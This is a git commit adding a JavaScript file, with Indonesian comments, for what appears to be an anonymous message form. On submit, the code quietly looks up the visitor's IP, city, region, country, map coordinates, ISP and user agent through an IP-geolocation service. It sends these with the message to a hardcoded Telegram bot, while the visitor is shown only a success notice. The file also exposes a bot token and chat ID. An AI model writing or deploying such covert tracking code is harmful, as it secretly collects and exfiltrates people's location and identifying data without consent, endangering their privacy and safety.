6995e391d682039a6fe349cfa77a1c6eb7b4e3d6
NaomyValen18 <kyyxbaraa@gmail.com>
2025-07-02 00:10:15 +0700

    Add files via upload

---
+++ script.js
@@ -0,0 +1,40 @@
+async function kirim() {
+  const pesan = document.getElementById("pesan").value;
+  if (!pesan.trim()) return alert("Pesan tidak boleh kosong!");
+
+  try {
+    // Ambil IP & Lokasi
+    const ip = await fetch("https://ipapi.co/json/").then(res => res.json());
+
+    const hasil = `
+📩 Pesan Baru Masuk:
+💬 *Pesan*: ${pesan}
+
+🌍 *IP*: ${ip.ip}
+🏙️ *Kota*: ${ip.city}
+🗺️ *Wilayah*: ${ip.region}
+🌐 *Negara*: ${ip.country_name}
+📍 *Maps*: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
+🏢 *ISP*: ${ip.org}
+🖥️ *Device*: ${navigator.userAgent}
+    `;
+
+    // Kirim ke Bot Telegram
+    await fetch(`https://api.telegram.org/bot<7787813252:AAHDuYArq78QFXqSSw-66L8oCO9qACyFnZk>/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: "<7607549215>",
+        text: hasil,
+        parse_mode: "Markdown"
+      })
+    });
+
+    alert("Pesan berhasil dikirim 😎");
+    document.getElementById("pesan").value = "";
+
+  } catch (e) {
+    console.error(e);
+    alert("Gagal mengirim pesan. Coba lagi.");
+  }
+}
